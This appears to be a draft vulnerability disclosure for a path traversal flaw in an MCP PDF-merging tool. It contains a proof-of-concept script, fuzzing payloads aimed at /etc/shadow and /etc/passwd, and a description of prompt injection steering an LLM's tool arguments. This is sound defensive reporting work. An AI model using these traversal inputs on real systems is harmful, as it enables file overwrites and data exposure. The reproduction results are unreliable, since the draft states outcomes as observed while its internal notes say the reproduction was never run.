# Path traversal in `merge-pdfs-ordered`: `base_path` and `output_path` reach any directory

**Repository:** `hanweg/mcp-pdf-tools` · **Tool:** `merge-pdfs-ordered` · **Tested commit:** `388ba1f`
**Weakness:** CWE-22 Path Traversal

## Summary
`merge-pdfs-ordered` walks `base_path`, picks PDFs whose names match `patterns`, merges them and writes the result to `output_path`. Neither path is checked. A caller can walk and read PDFs in any directory with `..` or an absolute `base_path`, and create or overwrite any file the server can write through `output_path`. The server has no configured base directory, so nothing ties these paths to the folders the user meant to share.

## Details
`src/pdf_tools/server.py:264-315` at `388ba1f`:

```python
    elif name == "merge-pdfs-ordered":
        base_path = arguments.get("base_path")
        patterns = arguments.get("patterns", [])
        output_path = arguments.get("output_path")
        ...
            for root, _, files in os.walk(base_path):
                for file in files:
                    if file.lower().endswith('.pdf'):
                        all_pdfs.append(os.path.join(root, file))
        ...
            merger = PyPDF2.PdfMerger()
            for pdf_path in selected_files:
                with open(pdf_path, 'rb') as pdf_file:
                    merger.append(pdf_file)

            with open(output_path, 'wb') as output_file:
                merger.write(output_file)
```

There is no `os.path.realpath` plus prefix check on either argument, no rejection of `..` or absolute paths, and no allow-list of directories. `output_path` is also independent of `base_path`, so even a well-chosen `base_path` does not limit where the output goes. `open(output_path, 'wb')` truncates an existing file. The reply then lists the basenames of the merged files, which reveals PDF names under the walked tree.

The other tools in this server (`extract-pages`, `merge-pdfs`, `search-pdfs`, `find-related-pdfs`) take paths the same way.

## Steps to reproduce
1. Prerequisites: Python 3.10+ and `uv`. No accounts or env vars. Create a marker file and an empty working folder first:

   ```bash
   mkdir -p /tmp/tofu-poc/root && echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Install as the README describes (Linux/macOS form), then create a one-page input PDF inside the working folder:

   ```bash
   git clone https://github.com/hanweg/mcp-pdf-tools.git
   cd mcp-pdf-tools && git checkout 388ba1f
   uv venv && uv pip install -e .
   .venv/bin/python -c "from PyPDF2 import PdfWriter; w = PdfWriter(); w.add_blank_page(width=72, height=72); w.write('/tmp/tofu-poc/root/in.pdf')"
   ```
3. Start the server with `/tmp/tofu-poc/root` as its working directory and call the tool with:

   ```json
   {"base_path": ".", "patterns": ["in.pdf"], "output_path": "../outside.txt", "fuzzy_matching": false}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="/path/to/mcp-pdf-tools/.venv/bin/pdf-tools",
           args=[],
           cwd="/tmp/tofu-poc/root",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("merge-pdfs-ordered", {
                   "base_path": ".",
                   "patterns": ["in.pdf"],
                   "output_path": "../outside.txt",
                   "fuzzy_matching": False,
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: the reply starts with `Successfully merged 1 PDFs into ../outside.txt`, and `head -c 5 /tmp/tofu-poc/outside.txt` prints `%PDF-` instead of `marker`. With `"output_path": "../new.txt"` the tool creates `/tmp/tofu-poc/new.txt`. With `"base_path": ".."` the tool also walks `/tmp/tofu-poc`, outside the working folder.

## Expected behavior
`base_path` and `output_path` are limited to directories the user configured. A path that resolves outside them, such as `../outside.txt`, is rejected and nothing outside `/tmp/tofu-poc/root` is read, created or changed.

## Actual behavior
The tool overwrites `/tmp/tofu-poc/outside.txt` and reports success. During fuzzing, traversal-shaped values in both arguments were accepted without any validation error; the calls stopped only because no PDF matched:

```
input:  {"base_path": "/tmp/testpdfs", "patterns": ["file1.pdf", "file2.pdf"], "output_path": "../../../../etc/shadow", "fuzzy_matching": false}
output: Warning: No matches found for pattern 'file1.pdf'
```

## Impact
In MCP the LLM chooses all arguments, and prompt injection from untrusted content (for example text inside a PDF being processed) can steer them. An attacker who controls the arguments can overwrite any file the server user can write with PDF bytes, and can enumerate PDF names and copy PDFs from any directory into a location of their choosing. File contents are not returned in the reply.

## Suggested fix
- Add an allow-list of directories (command-line arguments or an env var such as `PDF_TOOLS_ALLOWED_DIRS`).
- In a shared helper, resolve `base_path`, `output_path` and each selected file with `os.path.realpath()` and reject any that does not equal an allowed root or start with `root + os.sep`. Use the same helper in the other four tools.
- Refuse to overwrite an existing `output_path` unless the caller passes an explicit `overwrite: true`.

## Status on the default branch
Still present at `388ba1f` (2024-12-22). The default branch head is the tested commit.

## Prior reports
- #2 "Add MseeP.ai badge to README" (PR, open 2025-04-28): related only. A third-party badge PR whose body pastes an automated semgrep result, "Potentially unsafe file access", for `server.py` lines 164 and 168 (the `merge-pdfs` handler) "and 3 more medium severity issues" at unnamed locations. It does not name this tool, it is not a bug report, and nothing was changed.
- Documentation: README.md: "WORK IN PROGRESS - USE WITH CAUTION - Windows:" (a general caution only; the README does not say which paths the tools may touch, and there is no allowed-directory setting).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal (CWE-22). Only `check_path_traversal` fired for this tool. That check matches the input string (`../`, `..\`, `/etc/passwd`, `windows\win.ini`); no tracer-based alert fired.
- Campaigns and executions: corpus-sbx 2048 exec / 193 ok (60 s); e2-0922 1024 exec / 102 ok (60 s).
- Evidence (verbatim, trimmed):
  - `{'base_path': '../../../../etc/passwd', 'patterns': ['*.pdf'], 'output_path': 'merged.pdf', 'fuzzy_matching': True}` -> `"Warning: No matches found for pattern '*.pdf'"`
  - `{'base_path': '/etc/passwd\x00', 'patterns': ['*.pdf'], 'output_path': '/tmp/output/merged.pdf', 'fuzzy_matching': False}` -> `'Error merging PDFs: scandir: embedded null character in path'`
  - `{'base_path': '/tmp/testpdfs', 'patterns': ['file1.pdf', 'file2.pdf'], 'output_path': '../../../../etc/shadow', 'fuzzy_matching': False}` -> `"Warning: No matches found for pattern 'file1.pdf'"`
- Hand-check hints: real in code, weak in the logs. `os.walk(base_path)` at `server.py:276` and `open(output_path, 'wb')` at `:314` have no checks (verified by reading the code). None of the logged calls escaped or wrote anything: every one stopped at "no matches" or a null-byte error, and the alert is input-pattern only. The reproduction above was not executed; run it before filing. No root concept exists, so a maintainer may call arbitrary paths intended; frame it as adding an allowed-directories boundary and an overwrite guard. Consider one combined issue for all five tools.
</details>
